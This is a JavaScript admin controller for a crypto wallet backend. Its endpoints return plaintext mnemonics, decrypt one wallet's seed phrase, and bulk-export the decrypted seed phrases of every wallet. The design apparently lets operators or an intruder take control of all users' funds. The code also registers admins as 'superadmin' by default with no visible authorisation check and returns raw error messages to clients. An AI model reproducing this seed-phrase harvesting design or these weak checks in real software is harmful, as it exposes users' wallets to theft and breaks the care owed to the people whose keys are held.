/**
 * Admin Controller
 * ✅ UPDATED: Now uses centralized database
 */

const db = require("../db/index"); // ✅ Centralized DB
const authService = require("../security/auth.service");
const jwtService = require("../security/jwt.service");
const encryptionService = require("../services/security/encryption.service");
const auditLogger = require("../security/audit-logger.service");
const { success, error } = require("../utils/response");

exports.registerAdmin = async (req, res) => {
  try {
    const { name, email, password, role } = req.body;

    if (!name || !email || !password) {
      return error(res, "All fields required");
    }

    // Hash password
    const hashedPassword = await authService.hashPassword(password);

    const stmt = db.prepare(
      "INSERT INTO admins (name, email, password, role) VALUES (?, ?, ?, ?)"
    );

    const info = await stmt.run(
      name,
      email,
      hashedPassword,
      role || "superadmin"
    );

    auditLogger.logSecurityEvent({
      type: "ADMIN_REGISTERED",
      adminId: info.lastInsertRowid,
      email,
      role: role || "superadmin",
      ip: req.ip,
    });

    success(res, {
      message: "Admin registered successfully",
      id: info.lastInsertRowid,
    });
  } catch (e) {
    console.error("\n❌ Register Error:", {
      message: e.message,
      stack: e.stack,
      email: req.body?.email,
      endpoint: req.originalUrl,
    });

    if (
      e.message.includes("UNIQUE constraint") ||
      e.message.includes("Duplicate entry") ||
      e.code === "ER_DUP_ENTRY"
    ) {
      return error(res, "Email already exists");
    }
    auditLogger.logError(e, { controller: "registerAdmin" });
    error(res, e.message);
  }
};

// Helper function to check if admins table exists
async function checkAdminsTableExists() {
  try {
    const result = await db
      .prepare(
        `
      SELECT COUNT(*) as count 
      FROM information_schema.tables 
      WHERE table_schema = DATABASE() 
      AND table_name = 'admins'
    `
      )
      .get();
    return result && result.count > 0;
  } catch (e) {
    console.error("Error checking admins table:", e.message);
    return false;
  }
}

// Helper function to check if user exists
async function checkUserExists(email) {
  try {
    const admin = await db
      .prepare("SELECT id, email FROM admins WHERE email = ?")
      .get(email);
    return admin !== null;
  } catch (e) {
    console.error("Error checking user existence:", e.message);
    return false;
  }
}

exports.loginAdmin = async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return error(res, "Email and password required");
    }

    // Check if admins table exists
    const tableExists = await checkAdminsTableExists();
    if (!tableExists) {
      console.error("❌ Admins table does not exist!");
      return error(res, "Database not initialized. Please run database setup.");
    }

    // Check if user exists
    const userExists = await checkUserExists(email);
    if (!userExists) {
      console.log(`❌ User with email ${email} does not exist`);
      auditLogger.logAuthAttempt({
        success: false,
        email,
        ip: req.ip,
        userAgent: req.headers["user-agent"],
      });
      return error(res, "Invalid credentials");
    }

    // Get admin with proper parameter handling
    const stmt = db.prepare("SELECT * FROM admins WHERE email = ?");
    const admin = await stmt.get(email);

    if (!admin) {
      auditLogger.logAuthAttempt({
        success: false,
        email,
        ip: req.ip,
        userAgent: req.headers["user-agent"],
      });
      return error(res, "Invalid credentials");
    }

    // Compare password
    const isValidPassword = await authService.comparePassword(
      password,
      admin.password
    );

    if (!isValidPassword) {
      auditLogger.logAuthAttempt({
        success: false,
        email,
        ip: req.ip,
        userAgent: req.headers["user-agent"],
      });
      return error(res, "Invalid credentials");
    }

    // Generate tokens
    const tokens = jwtService.generateTokenPair({
      id: admin.id,
      email: admin.email,
      role: admin.role,
    });

    auditLogger.logAuthAttempt({
      success: true,
      email,
      ip: req.ip,
      userAgent: req.headers["user-agent"],
    });

    success(res, {
      message: "Login successful",
      admin: {
        id: admin.id,
        name: admin.name,
        email: admin.email,
        role: admin.role,
      },
      ...tokens,
    });
  } catch (e) {
    console.error("\n❌ Login Error:", {
      message: e.message,
      stack: e.stack,
      email: req.body?.email,
      endpoint: req.originalUrl,
      sqlState: e.sqlState,
      sqlMessage: e.sqlMessage,
    });
    auditLogger.logError(e, { controller: "loginAdmin" });
    error(res, e.message);
  }
};

exports.refreshToken = async (req, res) => {
  try {
    const { refreshToken } = req.body;

    if (!refreshToken) {
      return error(res, "Refresh token required");
    }

    const decoded = jwtService.verifyRefreshToken(refreshToken);

    const admin = await db
      .prepare("SELECT id, email, role FROM admins WHERE id = ?")
      .get(decoded.id);

    if (!admin) {
      return error(res, "Admin not found");
    }

    const tokens = jwtService.generateTokenPair(admin);

    success(res, tokens);
  } catch (e) {
    auditLogger.logError(e, { controller: "refreshToken" });
    error(res, e.message);
  }
};

exports.getAdminProfile = async (req, res) => {
  try {
    const { id } = req.params;
    const admin = await db
      .prepare(
        "SELECT id, name, email, role, created_at FROM admins WHERE id = ?"
      )
      .get(id);

    if (!admin) {
      return error(res, "Admin not found");
    }

    success(res, admin);
  } catch (e) {
    auditLogger.logError(e, { controller: "getAdminProfile" });
    error(res, e.message);
  }
};

/**
 * Get current authenticated admin's profile (for frontend)
 */
exports.getMyProfile = async (req, res) => {
  try {
    const userId = req.user.id;
    const admin = await db
      .prepare(
        "SELECT id, name, email, role, created_at FROM admins WHERE id = ?"
      )
      .get(userId);

    if (!admin) {
      return error(res, "Admin not found");
    }

    success(res, admin);
  } catch (e) {
    auditLogger.logError(e, { controller: "getMyProfile" });
    error(res, e.message);
  }
};

exports.listAdmins = async (req, res) => {
  try {
    const admins = await db
      .prepare("SELECT id, name, email, role, created_at FROM admins")
      .all();
    success(res, admins);
  } catch (e) {
    auditLogger.logError(e, { controller: "listAdmins" });
    error(res, e.message);
  }
};

exports.deleteAdmin = async (req, res) => {
  try {
    const { id } = req.params;

    await db.prepare("DELETE FROM admins WHERE id = ?").run(id);

    auditLogger.logSecurityEvent({
      type: "ADMIN_DELETED",
      adminId: id,
      deletedBy: req.user?.id,
      ip: req.ip,
    });

    success(res, { message: "Admin deleted successfully" });
  } catch (e) {
    auditLogger.logError(e, { controller: "deleteAdmin" });
    error(res, e.message);
  }
};

exports.getAllWallets = (req, res) => {
  try {
    // ✅ Now using centralized db - returns ALL data including mnemonic
    const wallets = db
      .prepare(
        `
      SELECT 
        id,
        name,
        wallet_name,
        device_passcode_id,
        public_address,
        mnemonic,
        backup_status,
        backup_date,
        first_transaction_date,
        first_transaction_hash,
        created_at,
        is_main,
        is_single_coin
      FROM wallets
      ORDER BY created_at DESC
    `
      )
      .all();

    success(res, wallets);
  } catch (e) {
    auditLogger.logError(e, { controller: "getAllWallets" });
    error(res, e.message);
  }
};

exports.getWalletById = async (req, res) => {
  try {
    const { id } = req.params;
    // ✅ Now using centralized db
    const wallet = await db
      .prepare(
        `
      SELECT 
        id,
        name,
        wallet_name,
        devicePassCodeId,
        device_passcode_id,
        public_address,
        isMain,
        isSingleCoin,
        created_at
      FROM wallets
      WHERE id = ?
    `
      )
      .get(id);

    if (!wallet) {
      return error(res, "Wallet not found");
    }

    // Get all networks for this wallet
    const networks = db
      .prepare(
        `
      SELECT id, address, network, created_at
      FROM wallet_networks
      WHERE wallet_id = ?
    `
      )
      .all(id);

    success(res, {
      ...wallet,
      networks,
    });
  } catch (e) {
    auditLogger.logError(e, { controller: "getWalletById" });
    error(res, e.message);
  }
};

/**
 * 🆕 GET WALLET SEED PHRASE (ADMIN ONLY - HIGHLY SENSITIVE)
 * This endpoint allows admins to retrieve the decrypted seed phrase for a wallet
 */
exports.getWalletSeedPhrase = async (req, res) => {
  try {
    const { id } = req.params;

    // Log this CRITICAL access
    auditLogger.logSecurityAlert({
      alert: "ADMIN_SEED_PHRASE_ACCESS",
      details: {
        adminId: req.user?.id,
        adminEmail: req.user?.email,
        walletId: id,
        timestamp: new Date().toISOString(),
      },
      ip: req.ip,
    });

    // ✅ Get wallet info from centralized db
    const wallet = await db
      .prepare("SELECT * FROM wallets WHERE id = ?")
      .get(id);

    if (!wallet) {
      return error(res, "Wallet not found");
    }

    // ✅ Get encrypted mnemonic from centralized db
    const mnemonic = db
      .prepare(
        `
      SELECT encrypted_mnemonic
      FROM encrypted_mnemonics
      WHERE wallet_id = ?
      LIMIT 1
    `
      )
      .get(id);

    if (!mnemonic || !mnemonic.encrypted_mnemonic) {
      return error(res, "Seed phrase not found for this wallet");
    }

    // Decrypt the mnemonic
    const decryptedMnemonic = encryptionService.decrypt(
      mnemonic.encrypted_mnemonic
    );

    // Get all networks
    const networks = db
      .prepare(
        `
      SELECT id, address, network, created_at
      FROM wallet_networks
      WHERE wallet_id = ?
    `
      )
      .all(id);

    success(res, {
      walletId: wallet.id,
      walletName: wallet.name || wallet.wallet_name,
      seedPhrase: decryptedMnemonic,
      primaryAddress: wallet.public_address,
      devicePassCodeId: wallet.device_passcode_id || wallet.devicePassCodeId,
      isMain: Boolean(wallet.is_main || wallet.isMain),
      isSingleCoin: Boolean(wallet.is_single_coin || wallet.isSingleCoin),
      created_at: wallet.created_at,
      networks,
      warning: "⚠️ HIGHLY SENSITIVE DATA - Store securely and never share",
    });
  } catch (e) {
    auditLogger.logError(e, {
      controller: "getWalletSeedPhrase",
      severity: "CRITICAL",
      adminId: req.user?.id,
    });
    error(res, "Failed to retrieve seed phrase");
  }
};

/**
 * 🆕 GET ALL WALLETS WITH SEED PHRASES (ADMIN ONLY - EXTREMELY SENSITIVE)
 * Export all wallets with their seed phrases for backup/recovery
 */
exports.getAllWalletsWithSeeds = async (req, res) => {
  try {
    // Log this CRITICAL mass access
    auditLogger.logSecurityAlert({
      alert: "ADMIN_MASS_SEED_EXPORT",
      details: {
        adminId: req.user?.id,
        adminEmail: req.user?.email,
        timestamp: new Date().toISOString(),
      },
      ip: req.ip,
    });

    // ✅ Get all wallets from centralized db
    const wallets = db
      .prepare(
        `
      SELECT id, name, wallet_name, devicePassCodeId, device_passcode_id, 
             public_address, isMain, isSingleCoin, created_at
      FROM wallets
      ORDER BY created_at DESC
    `
      )
      .all();

    const walletsWithSeeds = [];

    for (const wallet of wallets) {
      try {
        // ✅ Get encrypted mnemonic from centralized db
        const mnemonic = db
          .prepare(
            `
          SELECT encrypted_mnemonic
          FROM encrypted_mnemonics
          WHERE wallet_id = ?
          LIMIT 1
        `
          )
          .get(wallet.id);

        if (mnemonic && mnemonic.encrypted_mnemonic) {
          const decryptedMnemonic = encryptionService.decrypt(
            mnemonic.encrypted_mnemonic
          );

          const networks = db
            .prepare(
              `
            SELECT address, network
            FROM wallet_networks
            WHERE wallet_id = ?
          `
            )
            .all(wallet.id);

          walletsWithSeeds.push({
            walletId: wallet.id,
            walletName: wallet.name || wallet.wallet_name,
            seedPhrase: decryptedMnemonic,
            primaryAddress: wallet.public_address,
            devicePassCodeId:
              wallet.device_passcode_id || wallet.devicePassCodeId,
            isMain: Boolean(wallet.is_main || wallet.isMain),
            created_at: wallet.created_at,
            networks,
          });
        }
      } catch (err) {
        console.error(
          `Failed to decrypt seed for wallet ${wallet.id}:`,
          err.message
        );
      }
    }

    success(res, {
      totalWallets: walletsWithSeeds.length,
      wallets: walletsWithSeeds,
      warning: "⚠️ EXTREMELY SENSITIVE DATA - Handle with maximum security",
      exportedAt: new Date().toISOString(),
      exportedBy: req.user?.email,
    });
  } catch (e) {
    auditLogger.logError(e, {
      controller: "getAllWalletsWithSeeds",
      severity: "CRITICAL",
      adminId: req.user?.id,
    });
    error(res, "Failed to export wallets with seeds");
  }
};
